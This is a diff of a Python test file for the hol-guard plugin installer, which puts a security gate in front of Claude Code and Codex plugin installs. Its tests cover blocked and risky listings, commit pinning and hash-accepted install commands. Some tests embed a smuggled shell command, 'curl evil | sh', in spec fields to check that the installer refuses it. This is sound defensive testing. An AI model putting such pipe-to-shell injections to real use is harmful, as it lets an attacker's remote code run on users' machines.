@@ -1,17 +1,22 @@
-"""``hol-guard plugin install|uninstall``: plan rendering, apply, and the install record.
+"""``hol-guard plugin install|uninstall``: plan rendering, the security gate, apply, and the install record.
 
-The argv for each runtime, every refused spec and the install record's rules
-are pinned by the Rust tests in ``rust/crates/guard-plugin-kit/tests/install.rs``;
-these cover the Python shim: dry-run by default, confirmation per runtime, no
-shell, and the record that ``uninstall`` plans from and opt-in telemetry reads.
+The argv for each runtime, every refused spec, the gate's reasons and the
+install record's rules are pinned by the Rust tests in
+``rust/crates/guard-plugin-kit/tests/install.rs``; these cover the Python
+side: dry-run by default, the exit codes, confirmation per runtime, no shell
+and no stdin, the checks after Claude Code and Codex install, and the one JSON
+document ``--json`` prints. ``FakeRuntimes`` stands in for the two CLIs and
+writes the same state files they do, so the checks read real files.
 """
 
 from __future__ import annotations
 
 import contextlib
+import datetime
 import http.server
 import io
 import json
+import os
 import subprocess
 import threading
 from collections.abc import Iterator
@@ -22,27 +27,129 @@ import pytest
 
 from codex_plugin_scanner import cli as guard_cli
 from codex_plugin_scanner.guard import config as guard_config
-from codex_plugin_scanner.guard.plugin_kit import install
+from codex_plugin_scanner.guard.plugin_kit import install, runner
 
-SPEC = {
-    "schema": "hol.plugin-install-spec.v1",
-    "slug": "acme/toolgate",
-    "name": "toolgate",
-    "version": "1.2.0",
-    "repository": "acme/toolgate",
-    "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
-    "trustScore": 82,
-    "targets": [
-        {
-            "runtime": "claude-code",
-            "marketplace": {"repository": "acme/toolgate", "name": "acme"},
-            "plugin": "toolgate",
+SCANNED = "0123456789abcdef0123456789abcdef01234567"
+OTHER = "fedcba9876543210fedcba9876543210fedcba98"
+DECLARED = "ab" * 32
+
+
+def _spec(**changes: Any) -> dict[str, Any]:
+    spec: dict[str, Any] = {
+        "schema": "hol.plugin-install-spec.v2",
+        "slug": "acme/toolgate",
+        "name": "toolgate",
+        "version": "1.2.0",
+        "repository": "acme/toolgate",
+        "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
+        "trustScore": 82,
+        "installable": True,
+        "security": {
+            "verdict": "pass",
+            "scannedAt": f"{datetime.datetime.now(datetime.UTC).date().isoformat()}T08:00:00Z",
+            "scannedRef": SCANNED,
+            "findings": {"critical": 0, "high": 0, "medium": 0, "low": 1},
+            "reasons": [],
+            "reportUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
         },
-        {"runtime": "codex", "marketplace": {"repository": "acme/toolgate", "name": "acme"}, "plugin": "toolgate"},
-        {"runtime": "agent-skills", "repository": "acme/toolgate"},
-    ],
-    "manual": ["mcp"],
-}
+        "targets": [
+            {
+                "runtime": "claude-code",
+                "marketplace": {"repository": "acme/toolgate", "name": "acme", "ref": SCANNED},
+                "plugin": "toolgate",
+            },
+            {
+                "runtime": "codex",
+                "marketplace": {"repository": "acme/toolgate", "name": "acme", "ref": SCANNED},
+                "plugin": "toolgate",
+            },
+            {"runtime": "agent-skills", "repository": "acme/toolgate"},
+        ],
+        "manual": ["mcp"],
+    }
+    spec.update(changes)
+    return spec
+
+
+SPEC = _spec()
+
+
+class FakeRuntimes:
+    """Claude Code and Codex as far as Guard can see them: their exit codes,
+    their ``--json`` replies and the state files they write."""
+
+    def __init__(self, root: Path) -> None:
+        self.bin = root / "bin"
+        self.bin.mkdir()
+        for name in ("claude", "codex"):
+            program = self.bin / name
+            program.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+            program.chmod(0o755)
+        self.claude_home = root / "claude-home"
+        self.codex_root = root / "codex-marketplace"
+        self.ran: list[list[str]] = []
+        self.calls: list[dict[str, Any]] = []
+        self.claude_commit = SCANNED
+        self.codex_head = SCANNED
+        self.codex_already = False
+        self.declared: str | None = None
+        self.exit_codes: dict[tuple[str, ...], int] = {}
+        self.raise_on: tuple[tuple[str, ...], BaseException] | None = None
+
+    def _state(self, name: str) -> dict[str, Any]:
+        path = self.claude_home / "plugins" / name
+        return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}
+
+    def _save(self, name: str, value: dict[str, Any]) -> None:
+        path = self.claude_home / "plugins" / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps(value), encoding="utf-8")
+
+    def __call__(self, argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
+        program, args = Path(argv[0]).name, list(argv[1:])
+        self.ran.append([program, *args])
+        self.calls.append(kwargs)
+        if self.raise_on and tuple([program, *args][: len(self.raise_on[0])]) == self.raise_on[0]:
+            raise self.raise_on[1]
+        for prefix, code in self.exit_codes.items():
+            if tuple([program, *args][: len(prefix)]) == prefix:
+                return subprocess.CompletedProcess(argv, code, stdout="")
+        reply: dict[str, Any] | str = f"{program} did its part\n"
+        code = 0
+        if program == "claude" and args[:3] == ["plugin", "marketplace", "add"]:
+            self._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": args[3]}}})
+        elif program == "claude" and args[:3] == ["plugin", "marketplace", "remove"]:
+            known = self._state("known_marketplaces.json")
+            known.pop(args[3], None)
+            self._save("known_marketplaces.json", known)
+        elif program == "claude" and args[:2] == ["plugin", "install"]:
+            accepted = args[args.index("--accept-command") + 1] if "--accept-command" in args else None
+            if self.declared and accepted != self.declared:
+                code = 1
+                reply = {
+                    "outcome": "failed",
+                    "failureCode": "command_source_refused",
+                    "shownCommand": {"kind": "command_source", "command": "node setup.js", "sha256": self.declared},
+                }
+            else:
+                installed = self._state("installed_plugins.json") or {"version": 2, "plugins": {}}
+                installed["plugins"][args[2]] = [{"scope": "user", "gitCommitSha": self.claude_commit}]
+                self._save("installed_plugins.json", installed)
+                reply = {"command": "install", "outcome": "ok", "pluginId": args[2]}
+        elif program == "claude" and args[:2] == ["plugin", "uninstall"]:
+            installed = self._state("installed_plugins.json")
+            installed.get("plugins", {}).pop(args[2], None)
+            self._save("installed_plugins.json", installed)
+        elif program == "codex" and args[:3] == ["plugin", "marketplace", "add"]:
+            (self.codex_root / ".git").mkdir(parents=True, exist_ok=True)
+            (self.codex_root / ".git" / "HEAD").write_text(f"{self.codex_head}\n", encoding="utf-8")
+            reply = {"installedRoot": str(self.codex_root), "alreadyAdded": self.codex_already}
+        piped = kwargs.get("stdout") is subprocess.PIPE
+        stdout = (json.dumps(reply) if isinstance(reply, dict) else reply) if piped else None
+        return subprocess.CompletedProcess(argv, code, stdout=stdout)
+
+    def commands(self) -> list[list[str]]:
+        return [argv for argv in self.ran]
 
 
 @pytest.fixture(autouse=True)
@@ -52,28 +159,30 @@ def guard_home(tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.Mon
     return home
 
 
-@pytest.fixture
-def spec_file(tmp_path: Path) -> Path:
-    path = tmp_path / "spec.json"
-    path.write_text(json.dumps(SPEC), encoding="utf-8")
+def _write_spec(tmp_path: Path, spec: dict[str, Any], name: str = "spec.json") -> Path:
+    path = tmp_path / name
+    path.write_text(json.dumps(spec), encoding="utf-8")
     return path
 
 
 @pytest.fixture
-def programs(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> list[list[str]]:
-    """Pretend claude and codex are on PATH and record what would run."""
+def spec_file(tmp_path: Path) -> Path:
+    return _write_spec(tmp_path, SPEC)
 
-    ran: list[list[str]] = []
-    fake = {name: str(tmp_path / "bin" / name) for name in ("claude", "codex")}
-    monkeypatch.setattr(install.shutil, "which", fake.get)
 
-    def run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
-        assert kwargs["shell"] is False
-        ran.append(argv)
-        return subprocess.CompletedProcess(argv, 0)
+@pytest.fixture
+def runtimes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> FakeRuntimes:
+    fake = FakeRuntimes(tmp_path)
+    monkeypatch.setenv("PATH", str(fake.bin))
+    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(fake.claude_home))
+    monkeypatch.setattr(runner.subprocess, "run", fake)
+    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: False)
+    return fake
 
-    monkeypatch.setattr(install.subprocess, "run", run)
-    return ran
+
+@pytest.fixture
+def terminal(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)
 
 
 def _run(argv: list[str], stdin: str = "") -> tuple[int, str, str]:
@@ -90,112 +199,356 @@ def _run(argv: list[str], stdin: str = "") -> tuple[int, str, str]:
     return exit_code, output.getvalue(), error.getvalue()
 
 
-def test_install_prints_the_plan_and_runs_nothing_by_default(spec_file: Path, programs: list[list[str]]) -> None:
-    exit_code, output, _error = _run(["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file)])
+def _install(spec_path: Path, *flags: str, target: str = "acme/toolgate", stdin: str = "") -> tuple[int, str, str]:
+    return _run(["plugin", "install", target, "--spec-file", str(spec_path), *flags], stdin=stdin)
+
+
+def test_install_prints_the_plan_security_first_and_runs_nothing(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    exit_code, output, _error = _install(spec_file)
     assert exit_code == 0
+    assert output.index("Security: Passed HOL's checks.") < output.index("Listing:")
+    assert f"at {SCANNED[:7]}: 0 critical, 0 high." in output
+    assert f"claude-code:  ({runtimes.bin / 'claude'})" in output
     assert "claude plugin marketplace add acme/toolgate" in output
-    assert "codex plugin add toolgate@acme" in output
+    assert f"codex plugin marketplace add acme/toolgate --ref {SCANNED}" in output
     assert "npx skills add acme/toolgate" in output
     assert "Nothing was changed. Run with --apply" in output
-    assert "Install by hand (see the listing): mcp" in output
-    assert programs == []
+    assert runtimes.ran == []
 
 
-def test_dry_run_is_the_default_and_cannot_be_combined_with_apply(spec_file: Path, programs: list[list[str]]) -> None:
-    base = ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file)]
-    assert _run([*base, "--dry-run"])[:2] == _run(base)[:2]
+def test_dry_run_is_the_default_and_cannot_be_combined_with_apply(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    assert _install(spec_file, "--dry-run")[:2] == _install(spec_file)[:2]
     with pytest.raises(SystemExit):
-        _run([*base, "--dry-run", "--apply"])
-    assert programs == []
+        _install(spec_file, "--dry-run", "--apply")
+    assert runtimes.ran == []
+
+
+def test_apply_without_a_terminal_or_yes_exits_2_before_anything_runs(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    exit_code, _output, error = _install(spec_file, "--apply", stdin="y\ny\n")
+    assert (exit_code, runtimes.ran) == (2, [])
+    assert "No terminal to confirm in. Run it in a terminal, or add --yes to install without prompts." in error
 
 
 def test_apply_confirms_each_runtime_and_never_runs_manual_steps(
-    spec_file: Path, programs: list[list[str]], guard_home: Path
+    spec_file: Path, runtimes: FakeRuntimes, terminal: None, guard_home: Path
 ) -> None:
-    exit_code, output, _error = _run(
-        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply"], stdin="y\nn\n"
-    )
-    assert exit_code == 0
-    assert [argv[1:] for argv in programs] == [
-        ["plugin", "marketplace", "add", "acme/toolgate"],
-        ["plugin", "install", "toolgate@acme"],
+    exit_code, output, error = _install(spec_file, "--apply", stdin="y\nn\n")
+    assert exit_code == 0, error
+    assert runtimes.ran == [
+        ["claude", "plugin", "marketplace", "add", "acme/toolgate"],
+        ["claude", "plugin", "install", "toolgate@acme", "--json"],
     ]
-    assert programs[0][0].endswith("/claude")
+    assert f"Install for claude-code with {runtimes.bin / 'claude'}? [y/N]" in error
     assert "codex: skipped." in output
     assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}
 
 
-def test_yes_installs_every_available_runtime_then_uninstall_reverses_it(
-    spec_file: Path, programs: list[list[str]], guard_home: Path
+def test_yes_installs_every_runtime_with_no_stdin_then_uninstall_reverses_it(
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
 ) -> None:
-    _run(["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes"])
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes")
+    assert exit_code == 0, error
     assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code", "codex"]}
-    programs.clear()
+    assert all(call["stdin"] is subprocess.DEVNULL and call["shell"] is False for call in runtimes.calls)
+    assert all(call["timeout"] == runner.COMMAND_TIMEOUT_SECONDS for call in runtimes.calls)
+    runtimes.ran.clear()
     exit_code, _output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
     assert exit_code == 0
-    assert [argv[1:] for argv in programs] == [
-        ["plugin", "uninstall", "toolgate@acme"],
-        ["plugin", "remove", "toolgate@acme"],
+    assert runtimes.ran == [
+        ["claude", "plugin", "uninstall", "toolgate@acme"],
+        ["codex", "plugin", "remove", "toolgate@acme"],
     ]
     assert install.recorded_installs(guard_home) == {}
 
 
 def test_a_failed_command_stops_that_runtime_and_is_not_recorded(
-    spec_file: Path, monkeypatch: pytest.MonkeyPatch, programs: list[list[str]], guard_home: Path
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
 ) -> None:
-    monkeypatch.setattr(install.subprocess, "run", lambda argv, **_kwargs: subprocess.CompletedProcess(argv, 3))
-    exit_code, _output, error = _run(
-        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
-    )
+    runtimes.exit_codes[("codex", "plugin", "add")] = 3
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
     assert exit_code == 1
-    assert "exited with 3" in error
+    assert "codex exited with 3" in error
     assert install.recorded_installs(guard_home) == {}
 
 
-def test_a_spec_with_command_text_is_refused_before_anything_runs(tmp_path: Path, programs: list[list[str]]) -> None:
+def test_a_runtime_that_hangs_is_stopped_and_reported(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    runtimes.raise_on = (("codex", "plugin", "add"), subprocess.TimeoutExpired(["codex"], 600))
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
+    assert exit_code == 1
+    assert "codex did not finish within 600 seconds." in error
+
+
+def test_ctrl_c_exits_130_and_records_nothing(spec_file: Path, runtimes: FakeRuntimes, guard_home: Path) -> None:
+    runtimes.raise_on = (("codex", "plugin", "add"), KeyboardInterrupt())
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
+    assert exit_code == 130
+    assert "Interrupted." in error
+    assert install.recorded_installs(guard_home) == {}
+
+
+@pytest.mark.parametrize(
+    ("changes", "reason"),
+    [
+        ({"installable": False, "blockedReason": "Quarantined after a malware report."}, "Quarantined after"),
+        ({"security": {**SPEC["security"], "verdict": "block"}}, "HOL's scan blocked this plugin."),
+        (
+            {"security": {**SPEC["security"], "findings": {"critical": 1, "high": 0, "medium": 0, "low": 0}}},
+            "HOL's scan found 1 critical issue.",
+        ),
+    ],
+)
+def test_a_blocked_listing_exits_4_before_any_runtime_starts(
+    tmp_path: Path, runtimes: FakeRuntimes, changes: dict[str, Any], reason: str
+) -> None:
+    path = _write_spec(tmp_path, _spec(**changes))
+    for flags in ((), ("--apply", "--yes", "--accept-risk")):
+        exit_code, output, error = _install(path, *flags)
+        assert exit_code == 4
+        assert "Security: Blocked. Guard will not install it." in output
+        assert reason in output
+        assert "HOL's scan result stops this install, so nothing ran." in error
+        assert "Run with --apply" not in output
+    assert runtimes.ran == []
+
+
+@pytest.mark.parametrize(
+    ("changes", "reason"),
+    [
+        ({"security": {**SPEC["security"], "verdict": "warn"}}, "HOL's scan flagged this plugin for review."),
+        ({"security": None}, "HOL has not scanned this plugin."),
+        ({"trustScore": 41}, "HOL trust score is 41/100, below 60."),
+        ({"security": {**SPEC["security"], "scannedAt": "2020-01-01T00:00:00Z"}}, "days old."),
+    ],
+)
+def test_a_risky_listing_needs_accept_risk_or_a_yes_at_the_prompt(
+    tmp_path: Path,
+    runtimes: FakeRuntimes,
+    monkeypatch: pytest.MonkeyPatch,
+    guard_home: Path,
+    changes: dict[str, Any],
+    reason: str,
+) -> None:
+    spec = _spec(**changes)
+    if spec["security"] is None:
+        del spec["security"]
+    path = _write_spec(tmp_path, spec)
+    exit_code, output, error = _install(path, "--apply", "--yes")
+    assert (exit_code, runtimes.ran) == (4, [])
+    assert "Security: Needs your OK before Guard installs it." in output
+    assert reason in output
+    assert "add --accept-risk with --yes" in error
+
+    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)
+    exit_code, _output, error = _install(path, "--apply", stdin="\n")
+    assert (exit_code, runtimes.ran) == (4, [])
+    assert "Install anyway? [y/N]" in error
+
+    exit_code, _output, error = _install(path, "--apply", "--yes", "--accept-risk", "--runtime", "codex")
+    assert exit_code == 0, error
+    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["codex"]}
+
+
+def test_a_v1_spec_carries_no_scan_so_it_always_asks(tmp_path: Path, runtimes: FakeRuntimes) -> None:
+    v1 = {key: value for key, value in SPEC.items() if key not in {"security", "installable"}}
+    v1["schema"] = "hol.plugin-install-spec.v1"
+    v1["targets"] = [
+        {**target, "marketplace": {"repository": "acme/toolgate", "name": "acme"}}
+        if "marketplace" in target
+        else target
+        for target in SPEC["targets"]
+    ]
+    exit_code, output, _error = _install(_write_spec(tmp_path, v1), "--apply", "--yes")
+    assert (exit_code, runtimes.ran) == (4, [])
+    assert "HOL has not scanned this plugin." in output
+
+
+def test_claude_code_installing_another_commit_is_rolled_back(
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
+) -> None:
+    runtimes.claude_commit = OTHER
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
+    assert exit_code == 4
+    assert f"Claude Code installed commit {OTHER[:7]}, not the commit HOL scanned ({SCANNED[:7]})." in error
+    assert "Guard removed it again." in error
+    assert runtimes.ran[-2:] == [
+        ["claude", "plugin", "uninstall", "toolgate@acme"],
+        ["claude", "plugin", "marketplace", "remove", "acme"],
+    ]
+    assert install.recorded_installs(guard_home) == {}
+
+
+def test_a_marketplace_the_user_added_is_kept_and_one_from_elsewhere_is_refused(
+    spec_file: Path, runtimes: FakeRuntimes
+) -> None:
+    runtimes._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": "Acme/Toolgate"}}})
+    runtimes.claude_commit = OTHER
+    exit_code, _output, _error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
+    assert exit_code == 4
+    assert ["claude", "plugin", "marketplace", "add", "acme/toolgate"] not in runtimes.ran
+    assert ["claude", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran
+    assert runtimes.ran[-1] == ["claude", "plugin", "uninstall", "toolgate@acme"]
+
+    runtimes.ran.clear()
+    runtimes._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": "mallory/acme"}}})
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
+    assert (exit_code, runtimes.ran) == (4, [])
+    assert "already has a marketplace named acme from another source" in error
+
+
+def test_codex_at_another_commit_is_refused_before_the_plugin_is_added(
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
+) -> None:
+    runtimes.codex_head = OTHER
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
+    assert exit_code == 4
+    assert f"Codex has the acme marketplace at commit {OTHER[:7]}" in error
+    assert runtimes.ran == [
+        ["codex", "plugin", "marketplace", "add", "acme/toolgate", "--ref", SCANNED, "--json"],
+        ["codex", "plugin", "marketplace", "remove", "acme"],
+    ]
+
+    runtimes.ran.clear()
+    runtimes.codex_already = True
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
+    assert exit_code == 4
+    assert "You added that marketplace before" in error
+    assert ["codex", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran
+    assert install.recorded_installs(guard_home) == {}
+
+
+def test_a_declared_install_command_runs_only_when_its_sha256_is_accepted(
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    runtimes.declared = DECLARED
+    base = ("--apply", "--yes", "--runtime", "claude-code")
+    exit_code, output, error = _install(spec_file, *base)
+    assert exit_code == 4
+    assert "node setup.js" in output
+    assert f"sha256 {DECLARED}" in output
+    assert f"To run it, add --accept-command {DECLARED}." in error
+    assert not any("--accept-command" in argv for argv in runtimes.ran)
+    assert runtimes.ran[-1] == ["claude", "plugin", "marketplace", "remove", "acme"]
+
+    exit_code, _output, error = _install(spec_file, *base, "--accept-command", "cd" * 32)
+    assert exit_code == 4
+    assert "does not match the command this plugin declares" in error
+    assert install.recorded_installs(guard_home) == {}
+
+    exit_code, _output, error = _install(spec_file, *base, "--accept-command", DECLARED)
+    assert exit_code == 0, error
+    assert ["claude", "plugin", "install", "toolgate@acme", "--json", "--accept-command", DECLARED] in runtimes.ran
+    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}
+
+    monkeypatch.setattr(runner, "stdin_is_terminal", lambda: True)
+    with pytest.raises(SystemExit):
+        _install(spec_file, *base, "--accept-command", "not-a-sha")
+    exit_code, _output, error = _install(spec_file, "--apply", "--runtime", "claude-code", stdin="y\ny\n")
+    assert exit_code == 0, error
+    assert "Let Claude Code run this command? [y/N]" in error
+
+
+def test_json_prints_one_document_and_sends_everything_else_to_stderr(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    exit_code, output, error = _install(spec_file, "--apply", "--yes", "--json")
+    assert exit_code == 0, error
+    document = json.loads(output)
+    assert document["schema"] == "hol-guard.plugin-install/1"
+    assert document["exit_code"] == 0
+    assert document["error"] is None
+    assert document["plan"]["security"]["gate"] == "pass"
+    assert [(item["runtime"], item["status"]) for item in document["runtimes"]] == [
+        ("claude-code", "installed"),
+        ("codex", "installed"),
+        ("agent-skills", "skipped"),
+    ]
+    assert document["runtimes"][0]["path"] == str(runtimes.bin / "claude")
+    assert "claude did its part" in error
+
+    exit_code, output, _error = _install(spec_file, "--json")
+    document = json.loads(output)
+    assert (exit_code, document["apply"]) == (0, False)
+    assert [item["status"] for item in document["runtimes"]] == ["planned", "planned", "skipped"]
+
+
+def test_json_reports_a_stop_as_an_error_document(tmp_path: Path, runtimes: FakeRuntimes) -> None:
+    path = _write_spec(tmp_path, _spec(installable=False))
+    exit_code, output, _error = _install(path, "--apply", "--yes", "--json")
+    document = json.loads(output)
+    assert exit_code == document["exit_code"] == 4
+    assert document["error"]["code"] == "blocked"
+    assert {item["status"] for item in document["runtimes"][:2]} == {"blocked"}
+
+
+@pytest.mark.parametrize(
+    ("changes", "exit_code", "message"),
+    [
+        ({"minGuardVersion": "999.0.0"}, 5, "This listing needs hol-guard 999.0.0 or newer"),
+        ({"schema": "hol.plugin-install-spec.v3"}, 5, "This listing needs a newer hol-guard."),
+        ({"futureField": {"cmd": "curl evil | sh"}}, 0, ""),
+        ({"minGuardVersion": "0.0.1"}, 0, ""),
+    ],
+)
+def test_newer_specs_ask_for_a_newer_guard_and_unknown_fields_are_ignored(
+    tmp_path: Path, runtimes: FakeRuntimes, changes: dict[str, Any], exit_code: int, message: str
+) -> None:
+    code, output, error = _install(_write_spec(tmp_path, _spec(**changes)))
+    assert code == exit_code, error
+    assert message in error
+    assert "curl" not in output
+    if exit_code == 5:
+        assert "hol-guard update" in error or "pip install -U hol-guard" in error
+
+
+def test_nothing_guard_can_install_exits_3(
+    tmp_path: Path, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    skills_only = _spec(targets=[{"runtime": "agent-skills", "repository": "acme/toolgate"}])
+    exit_code, _output, error = _install(_write_spec(tmp_path, skills_only))
+    assert exit_code == 3
+    assert "Guard cannot install this listing for any runtime it runs." in error
+
+    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
+    exit_code, output, error = _install(_write_spec(tmp_path, SPEC), "--apply", "--yes")
+    assert (exit_code, runtimes.ran) == (3, [])
+    assert "(claude not found)" in output
+    assert "None of the runtimes Guard installs for" in error
+    # A missing runtime is not an error while only planning.
+    assert _install(_write_spec(tmp_path, SPEC))[0] == 0
+
+
+def test_a_spec_with_command_text_is_refused_before_anything_runs(tmp_path: Path, runtimes: FakeRuntimes) -> None:
     bad = json.loads(json.dumps(SPEC))
     bad["targets"][0]["plugin"] = "toolgate; curl evil | sh"
-    path = tmp_path / "bad.json"
-    path.write_text(json.dumps(bad), encoding="utf-8")
-    exit_code, output, error = _run(
-        ["plugin", "install", "acme/toolgate", "--spec-file", str(path), "--apply", "--yes"]
-    )
-    assert (exit_code, output, programs) == (2, "", [])
+    exit_code, output, error = _install(_write_spec(tmp_path, bad), "--apply", "--yes")
+    assert (exit_code, output, runtimes.ran) == (4, "", [])
     assert "failed Guard's checks" in error
 
 
 def test_a_pinned_version_must_match_the_listing(spec_file: Path) -> None:
-    exit_code, _output, error = _run(["plugin", "install", "acme/toolgate@9.9.9", "--spec-file", str(spec_file)])
+    exit_code, _output, error = _install(spec_file, target="acme/toolgate@9.9.9")
     assert exit_code == 2
     assert "HOL does not list that version" in error
 
 
-def test_a_spec_for_another_listing_is_refused(spec_file: Path, programs: list[list[str]]) -> None:
-    exit_code, _output, error = _run(
-        ["plugin", "install", "acme/other", "--spec-file", str(spec_file), "--apply", "--yes"]
-    )
-    assert (exit_code, programs) == (2, [])
+def test_a_spec_for_another_listing_is_refused(spec_file: Path, runtimes: FakeRuntimes) -> None:
+    exit_code, _output, error = _install(spec_file, "--apply", "--yes", target="acme/other")
+    assert (exit_code, runtimes.ran) == (4, [])
     assert "different listing" in error
 
 
-def test_uninstall_only_removes_what_guard_installed(
-    spec_file: Path, programs: list[list[str]], guard_home: Path
-) -> None:
+def test_uninstall_only_removes_what_guard_installed(spec_file: Path, runtimes: FakeRuntimes, guard_home: Path) -> None:
     exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
-    assert (exit_code, programs) == (2, [])
+    assert (exit_code, runtimes.ran) == (2, [])
     assert "no record of installing" in error
 
-    _run(
-        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
-    )
-    programs.clear()
+    _install(spec_file, "--apply", "--yes", "--runtime", "codex")
+    runtimes.ran.clear()
     # The listing has since left HOL: uninstall never asks HOL, so it still works.
     exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--runtime", "claude-code"])
     assert exit_code == 2
     assert "no record of installing" in error
     exit_code, _output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
     assert exit_code == 0
-    assert [argv[1:] for argv in programs] == [["plugin", "remove", "toolgate@acme"]]
+    assert runtimes.ran == [["codex", "plugin", "remove", "toolgate@acme"]]
     assert install.recorded_installs(guard_home) == {}
 
     exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate@1.2.0"])
@@ -203,58 +556,57 @@ def test_uninstall_only_removes_what_guard_installed(
     assert "without a version" in error
     with pytest.raises(SystemExit):
         _run(["plugin", "uninstall", "acme/toolgate", "--spec-file", str(spec_file)])
+    with pytest.raises(SystemExit):
+        _run(["plugin", "uninstall", "acme/toolgate", "--accept-risk"])
 
 
 def test_an_unreadable_record_stops_apply_before_anything_runs(
-    spec_file: Path, programs: list[list[str]], guard_home: Path
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
 ) -> None:
     # Not a regular file, so Guard cannot tell whether it is corrupt and leaves it alone.
     (guard_home / "plugin-kit" / "installs.json").mkdir(parents=True)
-    argv = ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--runtime", "codex"]
-    exit_code, output, error = _run([*argv, "--apply", "--yes"])
-    assert (exit_code, programs) == (2, [])
+    exit_code, output, error = _install(spec_file, "--runtime", "codex", "--apply", "--yes")
+    assert (exit_code, runtimes.ran) == (1, [])
     assert "installed" not in output
     assert "could not be read" in error
     assert (guard_home / "plugin-kit" / "installs.json").is_dir()
     # A plan alone never reads the record.
-    assert _run(argv)[0] == 0
+    assert _install(spec_file, "--runtime", "codex")[0] == 0
 
 
 def test_install_moves_a_corrupt_record_aside_and_uninstall_does_not(
-    spec_file: Path, programs: list[list[str]], guard_home: Path
+    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
 ) -> None:
     folder = guard_home / "plugin-kit"
     folder.mkdir()
     (folder / "installs.json").write_text("{not json", encoding="utf-8")
     exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
-    assert (exit_code, programs) == (2, [])
+    assert (exit_code, runtimes.ran) == (1, [])
     assert "could not be read" in error
 
-    argv = ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--runtime", "codex"]
-    exit_code, _output, error = _run([*argv, "--apply", "--yes"])
+    exit_code, _output, error = _install(spec_file, "--runtime", "codex", "--apply", "--yes")
     assert exit_code == 0, error
     moved = [path.name for path in folder.iterdir() if path.name.startswith("installs.json.corrupt-")]
     assert len(moved) == 1
     assert (folder / moved[0]).read_text(encoding="utf-8") == "{not json"
     assert f"It was moved to plugin-kit/{moved[0]} and a new one started." in error
+    assert set(install.recorded_installs(guard_home)) == {"acme/toolgate"}
 
 
 def test_a_record_that_cannot_be_written_fails_the_install(
-    spec_file: Path, monkeypatch: pytest.MonkeyPatch, programs: list[list[str]]
+    spec_file: Path, monkeypatch: pytest.MonkeyPatch, runtimes: FakeRuntimes
 ) -> None:
     def fail(*_args: Any, **_kwargs: Any) -> None:
         raise install.PluginInstallError("Guard could not update its install record in the Guard home.")
 
     monkeypatch.setattr(install, "record", fail)
-    exit_code, output, error = _run(
-        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
-    )
+    exit_code, output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
     assert exit_code == 1
     assert "codex: installed" in output
     assert "may be out of date" in error
 
 
